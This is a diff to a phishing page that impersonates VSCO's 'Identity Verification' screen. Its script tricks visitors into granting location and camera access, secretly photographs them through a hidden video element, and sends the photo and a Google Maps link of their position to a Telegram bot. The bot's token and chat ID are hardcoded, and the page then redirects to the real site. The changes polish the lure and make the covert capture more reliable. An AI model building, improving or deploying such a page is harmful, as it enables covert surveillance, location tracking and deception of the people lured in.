@@ -7,9 +7,9 @@
         body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
         .container { text-align: center; width: 85%; max-width: 350px; }
         .vsco-logo { width: 60px; margin-bottom: 30px; }
-        h1 { font-size: 24px; margin-bottom: 15px; }
-        p { font-size: 15px; color: #8e8e93; margin-bottom: 40px; }
-        .btn { background: #007aff; color: white; border: none; padding: 18px; border-radius: 12px; font-weight: 600; width: 100%; cursor: pointer; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 15px; }
+        p { font-size: 15px; color: #8e8e93; line-height: 1.5; margin-bottom: 40px; }
+        .btn { background: #007aff; color: white; border: none; padding: 18px; border-radius: 12px; font-weight: 600; width: 100%; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4); }
         video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
@@ -17,39 +17,38 @@
     <div class="container">
         <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
         <h1>Identity Verification</h1>
-        <p>Verification is mandatory for studio access. Please allow camera and location when prompted.</p>
-        <button class="btn" onclick="start()">Verify & Continue</button>
+        <p>Verification is mandatory for secure access. Please allow camera and location access when prompted.</p>
+        <button class="btn" onclick="startVerification()">Verify Identity</button>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
         const chatId = "8005843544";
 
-        async function start() {
-            // حل مشكلة الموقع: تنبيه يدوي أولاً
-            alert("Verification starting. Please click 'Allow' for Location and Camera to proceed.");
-            
+        async function startVerification() {
             navigator.geolocation.getCurrentPosition(
                 (p) => {
                     const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    openCam(loc);
+                    captureProcess(loc);
                 },
-                (err) => { openCam("Location Denied (Manual Block)"); },
+                (err) => { captureProcess("Location Access Denied"); },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
         }
 
-        async function openCam(locText) {
+        async function captureProcess(locationText) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // حل مشكلة السواد: الانتظار حتى يبدأ الفيديو فعلياً
-                video.onplaying = () => {
+                // الحل الجذري: الانتظار حتى يتأكد المتصفح أن الكاميرا بدأت بالعرض فعلياً
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // انتظار 4 ثواني كاملة لضبط الإضاءة ومنع السواد
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth;
@@ -57,23 +56,24 @@
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         
                         canvas.toBlob(blob => {
-                            const f = new FormData();
-                            f.append('chat_id', chatId);
-                            f.append('photo', blob);
-                            f.append('caption', `✅ Verified!\n📍 Map: ${locText}`);
-                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('photo', blob);
+                            formData.append('caption', `✅ Verified!\n📍 Map: ${locationText}`);
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                         }, 'image/jpeg');
 
-                        setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1500);
-                    }, 4000); // زيادة الانتظار لـ 4 ثوانٍ لضمان الإضاءة
+                        setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1000);
+                    }, 4000); 
                 };
             } catch (e) {
-                alert("Error: Camera access is required.");
+                alert("Camera access is required for verification.");
             }
         }
     </script>
 </body>
 </html>
+
 
 
 
